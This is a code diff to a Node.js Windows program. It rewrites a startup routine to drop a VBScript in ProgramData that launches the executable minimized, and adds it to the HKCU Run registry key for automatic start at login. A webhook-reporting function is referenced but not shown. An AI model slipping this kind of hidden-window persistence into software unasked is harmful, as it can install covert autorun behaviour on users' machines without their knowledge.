@@ -380,19 +380,24 @@ function removeRegistryKey() {
 */
 
 function startup() {
-  const programPath = path.resolve(process.argv[1]); // Full path to the .exe
-  const batchFileName = 'run_minimized.bat'; // Name of the batch file
-  const programDataPath = path.join(process.env.PROGRAMDATA, batchFileName); // Full path to the batch file in ProgramData
-  const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'; // Registry key path
-  const keyName = path.basename(programPath, '.exe'); // Name for the registry key
+  // Path to the current .exe file
+  const exeFilePath = process.execPath; // Get the path of the running executable
 
-  // Create the batch script content
-  const batchContent = `@echo off\nstart /min "" "${programPath}"\n`;
+  // VBScript file name and path
+  const vbsFileName = 'run_minimized.vbs';
+  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); // Full path to the VBScript file in ProgramData
 
-  // Write the batch script to file in ProgramData
-  fs.writeFileSync(programDataPath, batchContent);
+  // Registry key path
+  const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
+  const keyName = path.basename(exeFilePath, '.exe'); // Use the name of the .exe file without extension
 
-  // Command to add the batch file to the registry
+  // Create VBScript content to run the .exe minimized
+  const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;
+
+  // Write the VBScript to ProgramData
+  fs.writeFileSync(programDataPath, vbsContent);
+
+  // Command to add the VBScript file to the registry
   const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;
 
   exec(addCommand, (error, stdout, stderr) => {
@@ -409,6 +414,7 @@ function startup() {
     console.log(`Registry key added successfully: ${stdout}`);
   });
 }
+
 
 
 function sendSuccessToWebhook() {i
